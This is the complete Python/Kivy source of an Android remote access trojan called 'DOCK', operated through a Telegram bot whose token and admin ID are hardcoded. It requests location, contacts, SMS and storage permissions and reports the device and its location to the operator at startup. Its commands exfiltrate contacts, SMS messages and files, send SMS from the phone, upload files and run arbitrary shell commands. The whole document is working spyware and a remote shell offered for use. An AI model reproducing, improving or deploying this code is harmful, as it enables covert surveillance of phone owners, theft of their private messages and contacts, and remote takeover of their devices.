#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ANDROID RAT v1.0 - DOCK
Telegram C2: /start /info /location /contacts /sms /sendsms /files /download /upload /shell /uninstall
"""

import os
import sys
import time
import threading
import random
import string
import asyncio
import subprocess

# Kivy
from kivy.app import App
from kivy.uix.widget import Widget

# Telegram
from telegram import Bot
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

# Android
ANDROID_AVAILABLE = False
try:
    from jnius import autoclass
    from android.permissions import request_permissions, Permission
    from android import mActivity

    Context = autoclass('android.content.Context')
    Build = autoclass('android.os.Build')
    SmsManager = autoclass('android.telephony.SmsManager')
    LocationManager = autoclass('android.location.LocationManager')
    Criteria = autoclass('android.location.Criteria')
    Phone = autoclass('android.provider.ContactsContract$CommonDataKinds$Phone')
    Sms = autoclass('android.provider.Telephony$Sms')

    # Runtime permissions (Android 6+)
    REQUIRED_PERMISSIONS = [
        Permission.ACCESS_FINE_LOCATION,
        Permission.ACCESS_COARSE_LOCATION,
        Permission.READ_CONTACTS,
        Permission.READ_SMS,
        Permission.SEND_SMS,
        Permission.READ_EXTERNAL_STORAGE,
    ]

    ANDROID_AVAILABLE = True
except Exception:
    REQUIRED_PERMISSIONS = []

# ============================================================
# КОНФИГ
# ============================================================
BOT_TOKEN = "8960579548:AAFFob5s6x0dPaIDOVfKthQJtnGDFm2HnYk"
ADMIN_ID = 6212463438
VERSION = "1.0"


def _get_device_id():
    """Stable device id, persisted into app-private storage."""
    try:
        if ANDROID_AVAILABLE:
            d = mActivity.getFilesDir().getAbsolutePath()
        else:
            d = os.path.dirname(os.path.abspath(__file__))
        path = os.path.join(d, 'device_id')
        if os.path.exists(path):
            with open(path, 'r') as f:
                return f.read().strip()
        did = ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
        with open(path, 'w') as f:
            f.write(did)
        return did
    except Exception:
        return ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))


def _default_dir():
    """Writable default directory (app-private on API 30+, fallback /sdcard)."""
    if ANDROID_AVAILABLE:
        try:
            d = mActivity.getFilesDir().getAbsolutePath()
            if os.path.isdir(d):
                return d
        except Exception:
            pass
    return "/sdcard"


DEVICE_ID = _get_device_id()

# ============================================================
# ANDROID API
# ============================================================
class AndroidAPI:
    @staticmethod
    def get_device_info():
        if not ANDROID_AVAILABLE:
            return {'model': 'Emulator', 'os': 'Android'}
        try:
            return {
                'model': Build.MODEL,
                'brand': Build.BRAND,
                'os': 'Android',
                'sdk': Build.VERSION.SDK_INT,
                'release': Build.VERSION.RELEASE,
            }
        except Exception:
            return {'error': 'Error'}

    @staticmethod
    def get_location():
        if not ANDROID_AVAILABLE:
            return "0.0,0.0"
        try:
            lm = mActivity.getSystemService(Context.LOCATION_SERVICE)
            provider = lm.getBestProvider(Criteria(), True)
            if provider:
                loc = lm.getLastKnownLocation(provider)
                if loc:
                    return "%s,%s" % (loc.getLatitude(), loc.getLongitude())
            return "Unknown"
        except Exception:
            return "Unknown"

    @staticmethod
    def get_contacts():
        if not ANDROID_AVAILABLE:
            return []
        try:
            resolver = mActivity.getContentResolver()
            cursor = resolver.query(Phone.CONTENT_URI, None, None, None, None)
            contacts = []
            if cursor:
                while cursor.moveToNext():
                    name = cursor.getString(cursor.getColumnIndex(Phone.DISPLAY_NAME))
                    number = cursor.getString(cursor.getColumnIndex(Phone.NUMBER))
                    if name and number:
                        contacts.append("%s: %s" % (name, number))
                        if len(contacts) >= 50:
                            break
                cursor.close()
            return contacts
        except Exception:
            return []

    @staticmethod
    def get_sms():
        if not ANDROID_AVAILABLE:
            return []
        try:
            resolver = mActivity.getContentResolver()
            cursor = resolver.query(Sms.CONTENT_URI, None, None, None, "date DESC")
            sms_list = []
            if cursor:
                while cursor.moveToNext():
                    body = cursor.getString(cursor.getColumnIndex("body"))
                    address = cursor.getString(cursor.getColumnIndex("address"))
                    if body:
                        sms_list.append("%s: %s" % (address, body[:100]))
                        if len(sms_list) >= 20:
                            break
                cursor.close()
            return sms_list
        except Exception:
            return []

    @staticmethod
    def send_sms(phone, text):
        if not ANDROID_AVAILABLE:
            return False
        try:
            SmsManager.getDefault().sendTextMessage(phone, None, text, None, None)
            return True
        except Exception:
            return False

    @staticmethod
    def get_files(path):
        try:
            items = os.listdir(path)
            dirs = ["\U0001F4C1 %s" % f for f in sorted(items) if os.path.isdir(os.path.join(path, f))]
            files = ["\U0001F4C4 %s" % f for f in sorted(items) if not os.path.isdir(os.path.join(path, f))]
            return dirs + files
        except Exception:
            return ["\u274C Нет доступа"]
# ============================================================
# КОНТРОЛЛЕР
# ============================================================
class AndroidController:
    def __init__(self, bot_token, admin_id):
        self.bot_token = bot_token
        self.admin_id = admin_id
        self.running = True
        self.upload_waiting = False
        self.device_id = DEVICE_ID
        self.current_dir = _default_dir()

        self.bot = Bot(token=self.bot_token)
        self.application = None
        self._init_bot()
        self._send_startup_delayed()

    # ---------- startup ----------
    def _send_startup_delayed(self):
        def send():
            time.sleep(3)
            try:
                asyncio.run(self._send_startup())
            except Exception:
                pass
        threading.Thread(target=send, daemon=True).start()

    async def _send_startup(self):
        try:
            info = AndroidAPI.get_device_info()
            loc = AndroidAPI.get_location()
            await self.bot.send_message(
                chat_id=self.admin_id,
                text=(
                    "✅ DOCK v%s АКТИВИРОВАН\n"
                    "━━━━━━━━━━━━━━━━━\n"
                    "🆔 ID: `%s`\n"
                    "📱 Модель: `%s`\n"
                    "🤖 Android: `%s`\n"
                    "📍 Локация: `%s`\n"
                    "━━━━━━━━━━━━━━━━━\n"
                    "📌 /help - все команды"
                ) % (VERSION, self.device_id, info.get('model', 'Unknown'),
                     info.get('release', 'Unknown'), loc),
                parse_mode='Markdown'
            )
        except Exception as e:
            print("[-] Startup error: %s" % e)

    # ---------- bot runner ----------
    def _init_bot(self):
        try:
            self.application = Application.builder().token(self.bot_token).build()

            self.application.add_handler(CommandHandler("start", self.cmd_start))
            self.application.add_handler(CommandHandler("help", self.cmd_help))
            self.application.add_handler(CommandHandler("info", self.cmd_info))
            self.application.add_handler(CommandHandler("location", self.cmd_location))
            self.application.add_handler(CommandHandler("contacts", self.cmd_contacts))
            self.application.add_handler(CommandHandler("sms", self.cmd_sms))
            self.application.add_handler(CommandHandler("sendsms", self.cmd_sendsms))
            self.application.add_handler(CommandHandler("files", self.cmd_files))
            self.application.add_handler(CommandHandler("download", self.cmd_download))
            self.application.add_handler(CommandHandler("upload", self.cmd_upload))
            self.application.add_handler(CommandHandler("shell", self.cmd_shell))
            self.application.add_handler(CommandHandler("uninstall", self.cmd_uninstall))

            self.application.add_handler(MessageHandler(filters.Document.ALL, self.handle_document))
            self.application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, self.handle_text))

            threading.Thread(target=self._run_bot_loop, daemon=True).start()
            print("[+] Bot thread started")
        except Exception as e:
            print("[-] Init error: %s" % e)

    def _run_bot_loop(self):
        """Manual async loop: run_polling() relies on get_event_loop() and
        add_signal_handler(), which fail in a background thread on Android."""
        try:
            asyncio.run(self._poll())
        except Exception as e:
            print("[-] Bot loop error: %s" % e)

    async def _poll(self):
        app = self.application
        await app.initialize()
        await app.updater.start_polling(drop_pending_updates=True)
        await app.start()
        print("[+] Bot polling started")
        while self.running:
            await asyncio.sleep(1)
        if app.updater.running:
            await app.updater.stop()
        if app.running:
            await app.stop()
        await app.shutdown()
        print("[-] Bot stopped")
    # ---------- commands ----------
    def _check(self, update):
        if update.effective_chat is None:
            return False
        return update.effective_chat.id == self.admin_id

    async def cmd_start(self, update, context):
        if not self._check(update):
            await update.message.reply_text("❌ Доступ запрещён")
            return
        info = AndroidAPI.get_device_info()
        loc = AndroidAPI.get_location()
        await update.message.reply_text(
            "✅ DOCK v%s\n"
            "━━━━━━━━━━━━━━━━━\n"
            "🆔 ID: `%s`\n"
            "📱 Модель: `%s`\n"
            "🤖 Android: `%s`\n"
            "📍 Локация: `%s`\n"
            "━━━━━━━━━━━━━━━━━\n"
            "📌 /help - все команды" % (VERSION, self.device_id,
                                        info.get('model', 'Unknown'),
                                        info.get('release', 'Unknown'), loc),
            parse_mode='Markdown'
        )

    async def cmd_help(self, update, context):
        if not self._check(update):
            await update.message.reply_text("❌ Доступ запрещён")
            return
        text = (
            "📚 ВСЕ КОМАНДЫ DOCK v%s\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "📱 УСТРОЙСТВО\n"
            "/info - Информация\n"
            "/location - Геолокация\n"
            "/contacts - Контакты\n"
            "/sms - SMS\n"
            "/sendsms номер текст - Отправить SMS\n\n"
            "📁 ФАЙЛЫ\n"
            "/files [путь] - Список файлов\n"
            "/download путь - Скачать файл\n"
            "/upload - Загрузить файл (затем прислать)\n\n"
            "⚙️ СИСТЕМА\n"
            "/shell команда - Выполнить команду\n"
            "/uninstall - Удалить приложение\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━"
        ) % VERSION
        await update.message.reply_text(text)

    async def cmd_info(self, update, context):
        if not self._check(update):
            await update.message.reply_text("❌ Доступ запрещён")
            return
        info = AndroidAPI.get_device_info()
        await update.message.reply_text(
            "📊 ИНФОРМАЦИЯ\n"
            "━━━━━━━━━━━━━━━━━\n"
            "🆔 ID: `%s`\n"
            "📱 Модель: `%s`\n"
            "🏷 Бренд: `%s`\n"
            "🤖 Android: `%s (SDK %s)`\n"
            "📁 Дир: `%s`" % (self.device_id, info.get('model', 'Unknown'),
                              info.get('brand', 'Unknown'), info.get('release', 'Unknown'),
                              info.get('sdk', 'Unknown'), self.current_dir),
            parse_mode='Markdown'
        )

    async def cmd_location(self, update, context):
        if not self._check(update):
            await update.message.reply_text("❌ Доступ запрещён")
            return
        loc = await asyncio.to_thread(AndroidAPI.get_location)
        await update.message.reply_text("📍 Локация: `%s`" % loc, parse_mode='Markdown')

    async def cmd_contacts(self, update, context):
        if not self._check(update):
            await update.message.reply_text("❌ Доступ запрещён")
            return
        contacts = await asyncio.to_thread(AndroidAPI.get_contacts)
        if contacts:
            await update.message.reply_text("📇 Контакты:\n" + "\n".join(contacts[:30]))
        else:
            await update.message.reply_text("❌ Нет контактов")

    async def cmd_sms(self, update, context):
        if not self._check(update):
            await update.message.reply_text("❌ Доступ запрещён")
            return
        sms_list = await asyncio.to_thread(AndroidAPI.get_sms)
        if sms_list:
            await update.message.reply_text("📩 SMS:\n" + "\n".join(sms_list[:20]))
        else:
            await update.message.reply_text("❌ Нет SMS")

    async def cmd_sendsms(self, update, context):
        if not self._check(update):
            await update.message.reply_text("❌ Доступ запрещён")
            return
        args = context.args or []
        if len(args) < 2:
            await update.message.reply_text("❌ /sendsms номер текст")
            return
        phone = args[0]
        text = ' '.join(args[1:])
        ok = await asyncio.to_thread(AndroidAPI.send_sms, phone, text)
        if ok:
            await update.message.reply_text("✅ SMS отправлено на %s" % phone)
        else:
            await update.message.reply_text("❌ Ошибка отправки")

    async def cmd_files(self, update, context):
        if not self._check(update):
            await update.message.reply_text("❌ Доступ запрещён")
            return
        path = ' '.join(context.args or []) or self.current_dir
        if not os.path.exists(path):
            await update.message.reply_text("❌ Путь не существует: %s" % path)
            return
        self.current_dir = os.path.abspath(path)
        items = await asyncio.to_thread(AndroidAPI.get_files, self.current_dir)
        text = "📂 %s\n\n%s" % (self.current_dir, "\n".join(items[:100]))
        await update.message.reply_text(text[:4000])
    async def cmd_download(self, update, context):
        if not self._check(update):
            await update.message.reply_text("❌ Доступ запрещён")
            return
        path = ' '.join(context.args or [])
        if not path or not os.path.exists(path):
            await update.message.reply_text("❌ Файл не найден")
            return
        await update.message.reply_text("⬇️ Скачиваю...")

        def _read():
            with open(path, 'rb') as f:
                return f.read()

        try:
            data = await asyncio.to_thread(_read)
            await update.message.reply_document(document=data, filename=os.path.basename(path))
        except Exception as e:
            await update.message.reply_text("❌ %s" % e)

    async def cmd_upload(self, update, context):
        if not self._check(update):
            await update.message.reply_text("❌ Доступ запрещён")
            return
        self.upload_waiting = True
        await update.message.reply_text("📤 Отправьте файл")

    async def handle_document(self, update, context):
        if not self._check(update):
            return
        if not self.upload_waiting:
            await update.message.reply_text("ℹ️ Используйте /upload")
            return
        try:
            file = update.message.document
            obj = await context.bot.get_file(file.file_id)
            path = os.path.join(self.current_dir, file.file_name)
            await obj.download_to_drive(path)
            self.upload_waiting = False
            await update.message.reply_text("✅ Загружен: %s" % path)
        except Exception as e:
            await update.message.reply_text("❌ %s" % e)

    async def cmd_shell(self, update, context):
        if not self._check(update):
            await update.message.reply_text("❌ Доступ запрещён")
            return
        cmd = ' '.join(context.args or [])
        if not cmd:
            await update.message.reply_text("❌ /shell команда")
            return

        def _run():
            try:
                return subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10)
            except subprocess.TimeoutExpired:
                return None

        result = await asyncio.to_thread(_run)
        if result is None:
            await update.message.reply_text("⏱ Превышен таймаут (10 сек)")
            return
        out = result.stdout or result.stderr or "✅ Выполнено"
        await update.message.reply_text("```\n%s\n```" % out[:4000])

    async def cmd_uninstall(self, update, context):
        if not self._check(update):
            await update.message.reply_text("❌ Доступ запрещён")
            return
        await update.message.reply_text("⏳ Удаление...")

        def _uninstall():
            os.system("pm uninstall com.example.dock")
            os._exit(0)

        threading.Thread(target=_uninstall, daemon=True).start()

    async def handle_text(self, update, context):
        if not self._check(update):
            return
        await update.message.reply_text("❓ Неизвестная команда. /help")

    def run(self):
        try:
            while self.running:
                time.sleep(1)
        except KeyboardInterrupt:
            self.running = False

# ============================================================
# KIVY APP
# ============================================================
class RatApp(App):
    def build(self):
        return Widget()

    def on_start(self):
        if ANDROID_AVAILABLE:
            try:
                request_permissions(*REQUIRED_PERMISSIONS)
            except Exception as e:
                print("[-] Permissions error: %s" % e)
        self.controller = AndroidController(BOT_TOKEN, ADMIN_ID)
        threading.Thread(target=self.controller.run, daemon=True).start()

    def on_pause(self):
        return True

    def on_resume(self):
        pass

    def on_stop(self):
        if hasattr(self, 'controller'):
            self.controller.running = False


if __name__ == '__main__':
    RatApp().run()
